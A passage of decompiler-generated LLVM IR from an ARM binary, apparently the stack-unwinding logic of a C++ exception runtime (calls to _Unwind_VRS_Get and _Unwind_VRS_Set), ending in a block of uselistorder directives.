  store i32 %v1_19bf4, i32* @sl, align 4
  br i1 %v2_19b24, label %dec_label_pc_19bfc, label %dec_label_pc_19d68

dec_label_pc_19bfc:                               ; preds = %dec_label_pc_19be8
  %v2_19bfc = icmp eq i32 %v0_19cb4, 0
  br i1 %v2_19bfc, label %dec_label_pc_19d50, label %dec_label_pc_19c04

dec_label_pc_19c04:                               ; preds = %dec_label_pc_19bfc
  %v2_19c08 = icmp eq i32 %v1_19bf4, 0
  br i1 %v2_19c08, label %dec_label_pc_19c14.thread, label %bb159

dec_label_pc_19c14.thread:                        ; preds = %dec_label_pc_19c04
  br label %dec_label_pc_19e78

bb159:                                            ; preds = %dec_label_pc_19c04
  br i1 %v3_19c0c, label %dec_label_pc_19c1c, label %dec_label_pc_19d50

dec_label_pc_19c1c:                               ; preds = %bb159
  %v1_19c1c = add i32 %v0_19bec, 4
  store i32 %v1_19c1c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_19c2c = load i32, i32* @r8, align 4
  %v1_19c2c = add i32 %v0_19c2c, 88
  store i32 %v1_19c2c, i32* %sb.global-to-local, align 4
  store i32 %v1_19c1c, i32* @r4, align 4
  br label %dec_label_pc_19c50

dec_label_pc_19c40:                               ; preds = %bb161
  %v1_19c40 = add i32 %v0_19c40, 1
  store i32 %v1_19c40, i32* @r5, align 4
  %v1_19c44 = load i32, i32* @sl, align 4
  %v9_19c44 = icmp eq i32 %v1_19c40, %v1_19c44
  %v0_19c48 = load i32, i32* @r4, align 4
  %v1_19c48 = add i32 %v0_19c48, 4
  store i32 %v1_19c48, i32* @r4, align 4
  br i1 %v9_19c44, label %dec_label_pc_19e78, label %dec_label_pc_19c40.dec_label_pc_19c50_crit_edge

dec_label_pc_19c40.dec_label_pc_19c50_crit_edge:  ; preds = %dec_label_pc_19c40
  %v0_19c5c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_19c50

dec_label_pc_19c50:                               ; preds = %dec_label_pc_19c40.dec_label_pc_19c50_crit_edge, %dec_label_pc_19c1c
  %v0_19c5c = phi i32 [ %v0_19c5c.pre, %dec_label_pc_19c40.dec_label_pc_19c50_crit_edge ], [ %v1_19c2c, %dec_label_pc_19c1c ]
  %v1_19c60 = phi i32 [ %v1_19c48, %dec_label_pc_19c40.dec_label_pc_19c50_crit_edge ], [ %v1_19c1c, %dec_label_pc_19c1c ]
  %v1_19c50 = inttoptr i32 %v1_19c60 to i32*
  %v2_19c50 = load i32, i32* %v1_19c50, align 4
  %v2_19c54 = icmp eq i32 %v2_19c50, 0
  store i32 %v0_19c5c, i32* %forced_unwind_-44, align 4
  br i1 %v2_19c54, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_19c50
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_19c50, %bb160
  %v0_19c64 = load i32, i32* @r8, align 4
  store i32 %v0_19c64, i32* %r0.global-to-local, align 4
  store i32 %v2_19cf0, i32* %r2.global-to-local, align 4
  %v4_19c74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 100) to i32*), align 4
  store i32 105600, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19c74)
  %v0_19c80 = load i32, i32* %r0.global-to-local, align 4
  %v2_19c80 = icmp eq i32 %v0_19c80, 0
  %v0_19c40 = load i32, i32* @r5, align 4
  br i1 %v2_19c80, label %dec_label_pc_19c40, label %dec_label_pc_19c88

dec_label_pc_19c88:                               ; preds = %bb161
  %v1_19c88 = load i32, i32* @sl, align 4
  %v9_19c88 = icmp eq i32 %v0_19c40, %v1_19c88
  br i1 %v9_19c88, label %dec_label_pc_19e78, label %dec_label_pc_19c90

dec_label_pc_19c90:                               ; preds = %dec_label_pc_19c88
  %v0_19c90 = load i32, i32* @r7, align 4
  %v1_19c90 = inttoptr i32 %v0_19c90 to i32*
  %v2_19c90 = load i32, i32* %v1_19c90, align 4
  %v1_19c94 = icmp slt i32 %v2_19c90, 0
  %v0_19c9c.pre = load i32, i32* @r6, align 4
  br i1 %v1_19c94, label %dec_label_pc_19c9c, label %dec_label_pc_19d5c

dec_label_pc_19c9c:                               ; preds = %dec_label_pc_19c90, %dec_label_pc_19d54
  %v0_19c9c = phi i32 [ %storemerge, %dec_label_pc_19d54 ], [ %v0_19c9c.pre, %dec_label_pc_19c90 ]
  store i32 %v0_19c9c, i32* %r0.global-to-local, align 4
  %v1_19ca0 = add i32 %v0_19c9c, 4
  store i32 %v1_19ca0, i32* @r6, align 4
  br label %dec_label_pc_19d5c

dec_label_pc_19ca8:                               ; preds = %bb154
  store i32 %v1_19a28, i32* %r2.global-to-local, align 4
  br i1 %v2_19b24, label %dec_label_pc_19cb4, label %dec_label_pc_19da0

dec_label_pc_19cb4:                               ; preds = %dec_label_pc_19ca8
  %v2_19cb4 = icmp eq i32 %v0_19cb4, 0
  br i1 %v2_19cb4, label %dec_label_pc_19d20, label %dec_label_pc_19cbc

dec_label_pc_19cbc:                               ; preds = %dec_label_pc_19cb4
  %v0_19cbc = load i32, i32* @r7, align 4
  %v1_19cbc = add i32 %v0_19cbc, 4
  %v2_19cbc = inttoptr i32 %v1_19cbc to i32*
  %v3_19cbc = load i32, i32* %v2_19cbc, align 4
  %v7_19cc0 = icmp eq i32 %v3_19cbc, -2
  store i32 %v1_19cbc, i32* %r2.global-to-local, align 4
  br i1 %v7_19cc0, label %dec_label_pc_19bd8, label %dec_label_pc_19ccc

dec_label_pc_19ccc:                               ; preds = %dec_label_pc_19cbc
  %v0_19ccc = load i32, i32* @r8, align 4
  %v1_19ccc = add i32 %v0_19ccc, 88
  %v7_19cd0 = icmp eq i32 %v3_19cbc, -1
  store i32 %v1_19ccc, i32* %forced_unwind_-44, align 4
  br i1 %v7_19cd0, label %dec_label_pc_19d14, label %dec_label_pc_19cdc

dec_label_pc_19cdc:                               ; preds = %dec_label_pc_19ccc
  %v2_19ce0 = icmp eq i32 %v3_19cbc, 0
  br i1 %v2_19ce0, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_19cdc
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_19cdc, %bb162
  store i32 %v0_19ccc, i32* %r0.global-to-local, align 4
  store i32 %v2_19cf0, i32* %r2.global-to-local, align 4
  %v4_19cfc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 100) to i32*), align 4
  store i32 105736, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19cfc)
  %v0_19d08 = load i32, i32* %r0.global-to-local, align 4
  %v2_19d08 = icmp eq i32 %v0_19d08, 0
  br i1 %v2_19d08, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_19d14.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_19d14

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_19d20

dec_label_pc_19d14:                               ; preds = %.thread25, %dec_label_pc_19ccc
  %v3_19d14 = phi i32 [ %v3_19d14.pr, %.thread25 ], [ %v1_19ccc, %dec_label_pc_19ccc ]
  %v2_19d18 = icmp eq i32 %v3_19d14, 0
  br i1 %v2_19d18, label %dec_label_pc_19d20, label %dec_label_pc_19e78

dec_label_pc_19d20:                               ; preds = %bb164, %dec_label_pc_19dcc, %dec_label_pc_19da0, %dec_label_pc_19d14, %dec_label_pc_19cb4
  %v0_19d20 = load i32, i32* @r7, align 4
  %v1_19d20 = add i32 %v0_19d20, 8
  %v1_19a88 = inttoptr i32 %v1_19d20 to i32*
  %v2_19a88 = load i32, i32* %v1_19a88, align 4
  %v2_19a8c = icmp eq i32 %v2_19a88, 0
  br i1 %v2_19a8c, label %dec_label_pc_19b48, label %dec_label_pc_19a94.preheader

dec_label_pc_19d28:                               ; preds = %entry
  %v3_19d28 = udiv i32 %v2_19a1c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_19d38 = mul nuw nsw i32 %v3_19d28, 4
  %v3_19d3c = mul i32 %v2_19a1c, 65536
  %v2_19d40 = add i32 %v6_19d38, %v4_19a1c
  store i32 %v3_19d3c, i32* %v4_19a3c, align 8
  br label %dec_label_pc_19a64

dec_label_pc_19d50:                               ; preds = %bb159, %dec_label_pc_19bfc
  %v1_19d50 = add i32 %v0_19bec, 4
  br label %dec_label_pc_19d54

dec_label_pc_19d54:                               ; preds = %dec_label_pc_19d94, %dec_label_pc_19d50
  %v0_19d54 = phi i32 [ %v2_19d94, %dec_label_pc_19d94 ], [ %v2_19bec, %dec_label_pc_19d50 ]
  %storemerge = phi i32 [ %v4_19d94, %dec_label_pc_19d94 ], [ %v1_19d50, %dec_label_pc_19d50 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_19d54 = icmp slt i32 %v0_19d54, 0
  br i1 %v1_19d54, label %dec_label_pc_19c9c, label %dec_label_pc_19d5c

dec_label_pc_19d5c:                               ; preds = %dec_label_pc_19c90, %dec_label_pc_19d54, %dec_label_pc_19e68, %dec_label_pc_19c9c
  %v0_19d60 = phi i32 [ %v1_19ca0, %dec_label_pc_19c9c ], [ %storemerge, %dec_label_pc_19d54 ], [ %v1_19e6c, %dec_label_pc_19e68 ], [ %v0_19c9c.pre, %dec_label_pc_19c90 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_19c9c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19d54 ], [ %v1_19e68, %dec_label_pc_19e68 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19c90 ]
  %v0_19d5c = load i32, i32* @sl, align 4
  %v3_19d5c = mul i32 %v0_19d5c, 4
  %v2_19d60 = add i32 %v3_19d5c, %v0_19d60
  %v1_19a8865 = inttoptr i32 %v2_19d60 to i32*
  %v2_19a8866 = load i32, i32* %v1_19a8865, align 4
  %v2_19a8c68 = icmp eq i32 %v2_19a8866, 0
  br i1 %v2_19a8c68, label %dec_label_pc_19b48, label %dec_label_pc_19a94.preheader.lr.ph

dec_label_pc_19d68:                               ; preds = %dec_label_pc_19be8
  %v0_19d78 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19d78, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19d80 = load i32, i32* @r8, align 4
  %v1_19d80 = add i32 %v0_19d80, 32
  %v2_19d80 = inttoptr i32 %v1_19d80 to i32*
  %v3_19d80 = load i32, i32* %v2_19d80, align 4
  store i32 %v3_19d80, i32* @r4, align 4
  %v5_19d84 = call i32 @_Unwind_VRS_Get(i32 %v0_19d78, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19d84, i32* %r0.global-to-local, align 4
  %v3_19d88 = load i32, i32* %stack_var_-48, align 4
  %v0_19d8c = load i32, i32* @r4, align 4
  %v9_19d8c = icmp eq i32 %v0_19d8c, %v3_19d88
  br i1 %v9_19d8c, label %dec_label_pc_19e34, label %dec_label_pc_19d68.dec_label_pc_19d94_crit_edge

dec_label_pc_19d68.dec_label_pc_19d94_crit_edge:  ; preds = %dec_label_pc_19d68
  %v0_19d94.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_19d94

dec_label_pc_19d94:                               ; preds = %dec_label_pc_19d68.dec_label_pc_19d94_crit_edge, %dec_label_pc_19e34
  %v0_19d94 = phi i32 [ %v0_19d94.pre, %dec_label_pc_19d68.dec_label_pc_19d94_crit_edge ], [ %v1_19e38, %dec_label_pc_19e34 ]
  %v1_19d94 = inttoptr i32 %v0_19d94 to i32*
  %v2_19d94 = load i32, i32* %v1_19d94, align 4
  %v4_19d94 = add i32 %v0_19d94, 4
  store i32 %v4_19d94, i32* @r7, align 4
  br label %dec_label_pc_19d54

dec_label_pc_19da0:                               ; preds = %dec_label_pc_19ca8
  %v0_19db0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19db0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19db8 = load i32, i32* @r8, align 4
  %v1_19db8 = add i32 %v0_19db8, 32
  %v2_19db8 = inttoptr i32 %v1_19db8 to i32*
  %v3_19db8 = load i32, i32* %v2_19db8, align 4
  store i32 %v3_19db8, i32* @r4, align 4
  %v5_19dbc = call i32 @_Unwind_VRS_Get(i32 %v0_19db0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19dbc, i32* %r0.global-to-local, align 4
  %v3_19dc0 = load i32, i32* %stack_var_-48, align 4
  %v0_19dc4 = load i32, i32* @r4, align 4
  %v9_19dc4 = icmp eq i32 %v0_19dc4, %v3_19dc0
  br i1 %v9_19dc4, label %dec_label_pc_19dcc, label %dec_label_pc_19d20

dec_label_pc_19dcc:                               ; preds = %dec_label_pc_19da0
  %v0_19dcc = load i32, i32* @r8, align 4
  %v1_19dcc = add i32 %v0_19dcc, 40
  %v2_19dcc = inttoptr i32 %v1_19dcc to i32*
  %v3_19dcc = load i32, i32* %v2_19dcc, align 4
  %v1_19dd0 = load i32, i32* @r7, align 4
  %v9_19dd0 = icmp eq i32 %v3_19dcc, %v1_19dd0
  br i1 %v9_19dd0, label %dec_label_pc_19dd8, label %dec_label_pc_19d20

dec_label_pc_19dd8:                               ; preds = %dec_label_pc_19dcc
  %v1_19dd8 = inttoptr i32 %v3_19dcc to i32*
  %v2_19dd8 = load i32, i32* %v1_19dd8, align 4
  %v1_19ddc = and i32 %v2_19dd8, 1073741824
  %v2_19ddc = icmp eq i32 %v1_19ddc, 0
  br i1 %v2_19ddc, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_19dd8
  %v2_19de0 = or i32 %v2_19dd8, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_19dd8
  %tmp208 = bitcast i32 %v2_19dd8 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_19de4 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_19de8 = phi i32 [ %v2_19f18, %.thread28 ], [ %v2_19f18, %bb169 ], [ %v3_19dcc, %bb165 ], [ %v3_19dcc, %.thread26 ]
  %v0_19de8 = phi i32 [ %v2_19f28, %.thread28 ], [ %v2_19f24, %bb169 ], [ %v2_19de0, %bb165 ], [ %v2_19de4, %.thread26 ]
  %v2_19de8 = add i32 %v0_19de8, %v1_19de8
  store i32 %v2_19de8, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19e00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19e00, i32* %r0.global-to-local, align 4
  %v5_19e08 = call i32 @_Unwind_VRS_Set(i32 %v0_19e00, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_19e00, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_19e20 = load i32, i32* @r8, align 4
  store i32 %v0_19e20, i32* %stack_var_-48, align 4
  %v5_19e28 = call i32 @_Unwind_VRS_Set(i32 %v0_19e00, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19bdc

dec_label_pc_19e34:                               ; preds = %dec_label_pc_19d68
  %v0_19e34 = load i32, i32* @r8, align 4
  %v1_19e34 = add i32 %v0_19e34, 40
  %v2_19e34 = inttoptr i32 %v1_19e34 to i32*
  %v3_19e34 = load i32, i32* %v2_19e34, align 4
  %v1_19e38 = load i32, i32* @r7, align 4
  %v9_19e38 = icmp eq i32 %v3_19e34, %v1_19e38
  br i1 %v9_19e38, label %dec_label_pc_19e40, label %dec_label_pc_19d94

dec_label_pc_19e40:                               ; preds = %dec_label_pc_19e34
  %v1_19e44 = add i32 %v3_19e34, 4
  store i32 %v1_19e44, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_19e4c = add i32 %v0_19e34, 44
  %v3_19e4c = inttoptr i32 %v2_19e4c to i32*
  store i32 0, i32* %v3_19e4c, align 4
  %v0_19e50 = load i32, i32* %r2.global-to-local, align 4
  %v1_19e50 = load i32, i32* @r8, align 4
  %v2_19e50 = add i32 %v1_19e50, 48
  %v3_19e50 = inttoptr i32 %v2_19e50 to i32*
  store i32 %v0_19e50, i32* %v3_19e50, align 4
  %v0_19e54 = load i32, i32* @sl, align 4
  %v1_19e54 = load i32, i32* @r8, align 4
  %v2_19e54 = add i32 %v1_19e54, 40
  %v3_19e54 = inttoptr i32 %v2_19e54 to i32*
  store i32 %v0_19e54, i32* %v3_19e54, align 4
  %v0_19e58 = load i32, i32* %r0.global-to-local, align 4
  %v1_19e58 = load i32, i32* @r8, align 4
  %v2_19e58 = add i32 %v1_19e58, 52
  %v3_19e58 = inttoptr i32 %v2_19e58 to i32*
  store i32 %v0_19e58, i32* %v3_19e58, align 4
  %v0_19e5c = load i32, i32* @r7, align 4
  %v1_19e5c = inttoptr i32 %v0_19e5c to i32*
  %v2_19e5c = load i32, i32* %v1_19e5c, align 4
  %v1_19e60 = icmp slt i32 %v2_19e5c, 0
  br i1 %v1_19e60, label %dec_label_pc_19e68, label %dec_label_pc_19f14

dec_label_pc_19e68:                               ; preds = %dec_label_pc_19e40
  %v0_19e68 = load i32, i32* %r2.global-to-local, align 4
  %v1_19e68 = add i32 %v0_19e68, -3
  store i32 %v1_19e68, i32* %r2.global-to-local, align 4
  %v0_19e6c = load i32, i32* %r0.global-to-local, align 4
  %v1_19e6c = add i32 %v0_19e6c, 4
  store i32 %v1_19e6c, i32* @r6, align 4
  br label %dec_label_pc_19d5c

dec_label_pc_19e78:                               ; preds = %dec_label_pc_19c88, %dec_label_pc_19d14, %dec_label_pc_19c40, %dec_label_pc_19c14.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19e88 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19e88, i32* %r0.global-to-local, align 4
  %v5_19e90 = call i32 @_Unwind_VRS_Get(i32 %v0_19e88, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_19e94 = load i32, i32* @r7, align 4
  %v1_19e94 = load i32, i32* @r8, align 4
  %v2_19e94 = add i32 %v1_19e94, 40
  %v3_19e94 = inttoptr i32 %v2_19e94 to i32*
  store i32 %v0_19e94, i32* %v3_19e94, align 4
  %v3_19e98 = load i32, i32* %stack_var_-48, align 4
  %v3_19e9c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_19e9c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_19ea4 = load i32, i32* @r8, align 4
  %v2_19ea4 = add i32 %v1_19ea4, 32
  %v3_19ea4 = inttoptr i32 %v2_19ea4 to i32*
  store i32 %v3_19e98, i32* %v3_19ea4, align 4
  %v0_19ea8 = load i32, i32* %r2.global-to-local, align 4
  %v1_19ea8 = load i32, i32* @r8, align 4
  %v2_19ea8 = add i32 %v1_19ea8, 36
  %v3_19ea8 = inttoptr i32 %v2_19ea8 to i32*
  store i32 %v0_19ea8, i32* %v3_19ea8, align 4
  %v1_19be4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19bdc

dec_label_pc_19eb0:                               ; preds = %bb155
  %v1_19eb0 = inttoptr i32 %v0_19b38 to i32*
  %v2_19eb0 = load i32, i32* %v1_19eb0, align 4
  %v1_19eb4 = add i32 %v0_19b38, 4
  %v1_19eb8 = and i32 %v2_19eb0, 1073741824
  %v2_19eb8 = icmp eq i32 %v1_19eb8, 0
  %v2_19ebc = or i32 %v2_19eb0, -2147483648
  %tmp210 = bitcast i32 %v2_19eb0 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_19ec0 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_19eb8, i32 %v2_19ec0, i32 %v2_19ebc
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_19ec4 = load i32, i32* @r8, align 4
  %v2_19ec4 = add i32 %v1_19ec4, 56
  %v3_19ec4 = inttoptr i32 %v2_19ec4 to i32*
  store i32 %v1_19eb4, i32* %v3_19ec4, align 4
  %v0_19ec8 = load i32, i32* @r8, align 4
  store i32 %v0_19ec8, i32* %r0.global-to-local, align 4
  %v4_19ed4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 28) to i32*), align 4
  store i32 106208, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19ed4)
  %v0_19ee0 = load i32, i32* %r0.global-to-local, align 4
  %v2_19ee0 = icmp eq i32 %v0_19ee0, 0
  br i1 %v2_19ee0, label %dec_label_pc_19bd8, label %dec_label_pc_19ee8

dec_label_pc_19ee8:                               ; preds = %dec_label_pc_19eb0
  %v0_19ee8 = load i32, i32* %r4.global-to-local, align 4
  %v1_19ee8 = load i32, i32* @r7, align 4
  %v2_19ee8 = add i32 %v1_19ee8, %v0_19ee8
  store i32 %v2_19ee8, i32* %stack_var_-48, align 4
  %v0_19ef8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19ef8, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_19f08 = call i32 @_Unwind_VRS_Set(i32 %v0_19ef8, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19bdc

dec_label_pc_19f14:                               ; preds = %dec_label_pc_19e40
  %v0_19f14 = load i32, i32* @sl, align 4
  %v3_19f14 = mul i32 %v0_19f14, 4
  %v0_19f18 = load i32, i32* %r0.global-to-local, align 4
  %v2_19f18 = add i32 %v0_19f18, %v3_19f14
  %v3_19f18 = inttoptr i32 %v2_19f18 to i32*
  %v4_19f18 = load i32, i32* %v3_19f18, align 4
  %v1_19f1c = and i32 %v4_19f18, 1073741824
  %v2_19f1c = icmp eq i32 %v1_19f1c, 0
  br i1 %v2_19f1c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_19f14
  %v2_19f24 = or i32 %v4_19f18, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_19f14
  %tmp212 = bitcast i32 %v4_19f18 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_19f28 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_19f18, { 2, 1, 0 }
  uselistorder i32 %v1_19e6c, { 1, 0 }
  uselistorder i32 %v1_19e68, { 1, 0 }
  uselistorder i32 %v1_19e38, { 1, 0 }
  uselistorder i32 %v0_19e00, { 1, 0, 2, 3 }
  uselistorder i32 %v3_19dcc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_19d94, { 1, 0 }
  uselistorder i32 %v0_19d94, { 1, 0 }
  uselistorder i32 %v2_19a8866, { 1, 0 }
  uselistorder i32 %v2_19d60, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_19a88, { 1, 0 }
  uselistorder i32 %v1_19d20, { 1, 0 }
  uselistorder i32 %v3_19cbc, { 2, 0, 1 }
  uselistorder i32 %v0_19c9c, { 1, 0 }
  uselistorder i32 %v0_19c9c.pre, { 1, 0 }
  uselistorder i32 %v1_19bf4, { 1, 0 }
  uselistorder i32 %v2_19bec, { 1, 0 }
  uselistorder i32 %v0_19b7c, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_19b3c, { 1, 0 }
  uselistorder i32 %v1_19b38, { 1, 0 }
  uselistorder i32 %v0_19b38, { 1, 0, 2 }
  uselistorder i32 %v4_19b10, { 0, 2, 1, 3 }
  uselistorder i32 %v0_19cb4, { 1, 2, 0 }
  uselistorder i32 %v0_19ae8, { 1, 0 }
  uselistorder i32 %v3_19ae4, { 1, 0, 2 }
  uselistorder i32 %v1_19ab8, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_19cf0, { 1, 0 }
  uselistorder i1 %v2_19b24, { 1, 0, 2 }
  uselistorder i32 %v1_19a28, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 80, 0, 15, 16, 79, 4, 34, 35, 17, 30, 18, 31, 19, 32, 20, 33, 2, 28, 36, 29, 37, 21, 38, 1, 5, 39, 40, 22, 41, 6, 42, 43, 44, 23, 45, 7, 46, 47, 48, 24, 49, 50, 51, 25, 52, 53, 54, 55, 8, 56, 57, 58, 59, 9, 60, 61, 62, 63, 64, 26, 65, 10, 66, 67, 68, 69, 70, 71, 27, 72, 11, 73, 74, 75, 76, 12, 77, 13, 14, 3, 78 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 25, 1, 2, 5, 12, 13, 9, 10, 11, 14, 18, 15, 6, 20, 21, 3, 22, 0, 23, 24, 7, 8, 16, 17, 19, 4 }
  uselistorder i32 48, { 18, 2, 0, 7, 5, 6, 10, 11, 8, 9, 15, 16, 17, 12, 13, 3, 4, 14, 1 }
  uselistorder i32 44, { 42, 2, 43, 44, 0, 14, 3, 16, 4, 5, 6, 26, 27, 28, 29, 30, 31, 23, 24, 25, 7, 21, 22, 8, 1, 9, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 10, 11, 12, 13, 15, 17, 18, 19, 20 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 146, 151, 145, 29, 28, 150, 30, 31, 32, 33, 34, 35, 36, 143, 37, 39, 38, 40, 2, 41, 0, 3, 42, 43, 45, 44, 1, 48, 46, 47, 49, 147, 51, 50, 54, 55, 56, 52, 53, 57, 58, 60, 61, 62, 59, 63, 148, 64, 66, 65, 68, 67, 69, 149, 70, 72, 71, 74, 73, 79, 75, 80, 76, 81, 77, 78, 82, 83, 84, 85, 87, 88, 86, 144, 90, 89, 93, 94, 95, 91, 92, 96, 103, 97, 104, 98, 105, 99, 106, 100, 107, 101, 102, 109, 108, 110, 111, 112, 113, 118, 114, 119, 115, 120, 116, 117, 122, 121, 123, 124, 125, 128, 126, 129, 127, 130, 131, 132, 133, 134, 136, 137, 135, 138, 140, 141, 139, 142 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 7, 8, 5, 0, 6, 2, 3, 1, 4 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_23010.367 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 114, 32, 76, 115, 81 }
  uselistorder i32 -2, { 0, 30, 31, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 26, 25, 27, 28, 29, 18, 19, 20, 21, 22, 23, 24, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 80, { 14, 15, 16, 0, 2, 1, 3, 4, 5, 12, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19e78, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_19d94, { 1, 0 }
  uselistorder label %dec_label_pc_19d5c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_19d20, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_19c9c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_19bdc, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_19bd8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_19b38, { 1, 0 }
